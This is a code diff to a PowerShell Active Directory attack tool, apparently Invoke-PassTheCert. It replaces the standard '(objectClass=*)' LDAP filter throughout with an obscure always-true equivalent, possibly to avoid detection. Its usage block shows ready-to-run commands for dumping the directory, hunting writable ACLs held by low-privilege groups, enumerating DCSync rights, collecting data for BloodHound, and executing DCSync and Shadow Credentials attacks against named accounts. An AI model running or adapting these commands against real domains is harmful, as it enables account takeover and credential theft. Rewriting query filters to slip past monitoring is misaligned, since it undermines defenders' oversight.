@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.11.4 "
+    Write-Host -ForegroundColor Red     "   v1.11.5 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -7897,7 +7897,7 @@ function _GetAttributeOfObject {
     $SearchResponse = $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.SearchRequest(
             $ObjectDN, 
-            '(objectClass=*)', 
+            '(|(a=*)(!(a=*)))', 
             [System.DirectoryServices.SearchScope]::Base,
             $Attribute
         ))
@@ -9610,6 +9610,7 @@ function _Filter {
 
             - Suffixing the command with `|fl` pipe allows to print the multi-valued attributes conveniently, i.e. separated by new lines (e.g. `serviceprincipalename`, `memberof`) (no more "...").
             - Returns `$null` if no entry is found.
+            - When none of the filter parameter is set, the default filter becomes '(|(a=*)(!(a=*)))', i.e. an always true filter
 
         .PARAMETER LdapConnection
 
@@ -9685,7 +9686,7 @@ function _Filter {
 
         .EXAMPLE
 
-            _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base -Properties * -LDAPFilter '(objectClass=*)'
+            _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base
 
             Returns the RootDSE (Root Directory Server Agent Service Entry), i.e. the LDAP Server's information about itself, with NO base (hence NULL)
 
@@ -9697,7 +9698,7 @@ function _Filter {
 
         .EXAMPLE
 
-            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Base -Properties * -LDAPFilter '(objectClass=*)'
+            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Base
 
             Returns the object `DC=X` itself (using `-SearchScope Base`)
 
@@ -9723,13 +9724,13 @@ function _Filter {
 
         .EXAMPLE
 
-            _Filter -LdapConnection $LdapConnection -SearchBase "OU=Unity,DC=X" -SearchScope Subtree -Properties 'distinguishedName' -LDAPFilter '(objectClass=*)'
+            _Filter -LdapConnection $LdapConnection -SearchBase "OU=Unity,DC=X" -SearchScope Subtree -Properties 'distinguishedName'
 
             Returns all members of the Organizational Unit `Unity`, recursive lookup (using `-SearchScope Subtree`)
 
         .EXAMPLE
 
-            _Filter -LdapConnection $LdapConnection -SearchBase "OU=Unity,DC=X" -SearchScope OneLevel -Properties 'distinguishedName' -LDAPFilter '(objectClass=*)'
+            _Filter -LdapConnection $LdapConnection -SearchBase "OU=Unity,DC=X" -SearchScope OneLevel -Properties 'distinguishedName'
 
             Returns all members of the Organizational Unit `Unity`, no recursive lookup (using `-SearchScope OneLevel`)
 
@@ -9920,8 +9921,8 @@ function _Filter {
             return $null
         }
     } else {
-        # Defaults to any object, when no filter is specified
-        $MyFilter = '(objectClass=*)'
+        # Defaults to an always true filter, when no filter is specified
+        $MyFilter = '(|(a=*)(!(a=*)))'
     }
 
     Write-Verbose "[*] Performing '$MyFilter' LDAP Query On Base '$SearchBase', In Scope '$SearchScope'..."
@@ -11381,7 +11382,7 @@ function _GetInboundSDDLs {
     $SearchResponse = $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.SearchRequest(
             $ObjectDN,
-            '(objectClass=*)', 
+            '(|(a=*)(!(a=*)))', 
             [System.DirectoryServices.SearchScope]::Base,
             'nTSecurityDescriptor'
         ))
@@ -14213,7 +14214,7 @@ function _PowerHound {
 
         Write-Host ""
 
-        Write-Host "[*] If, For Some Reasons, The BloodHound Upload Cancelled, You May Need To Retry Importing The Collection Multiple Times."
+        Write-Host "[*] If, For Some Reasons, The BloodHound Upload Canceled, You May Need To Retry Importing The Collection Multiple Times."
         Write-Host -ForegroundColor Blue "[+] Happy Graphing !"
 
     } else {
@@ -14619,13 +14620,14 @@ function Invoke-PassTheCert {
 
             [5] Enjoy ! For instance (you MAY add `-Verbose`):
                 
-                PS > $DumpLdap = Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=*)'
+                PS > $DumpLdap = Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(|(a=*)(!(a=*)))'
                 PS > $DumpLdap |?{$_.sAMAccountName -ne $null -and ($_.useraccountcontrol -like '*WORKSTATION_TRUST_ACCOUNT*' -or $_.useraccountcontrol -like '*NORMAL_ACCOUNT*')} |Select-Object sAMAccountName,description,useraccountcontrol,distinguishedname,serviceprincipalname |fl
                 
                 PS > $DumpInboundACLs = Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection $LdapConnection -Object 'CN=Kinda KU. USY,CN=Users,DC=X'
                 PS > $DumpInboundACLs |?{ $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and ($_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}513' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}515' -or $_.SecurityIdentifier -in @('S-1-1-0', 'S-1-5-11', 'S-1-5-15', 'S-1-5-7', 'S-1-5-32-545', 'S-1-5-32-546')) }
 
                 PS > Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'DCSync'
+                PS > Invoke-PassTheCert -Action 'PowerHound' -LdapConnection $LdapConnection -Domain 'ADLAB.LOCAL'
 
                 PS > Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'DCSync' -Identity 'CN=John JD. DOE,CN=Users,DC=X' -Target 'DC=X'
                 PS > Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -Target 'jdoe' -TargetDomain 'X' -Verbose
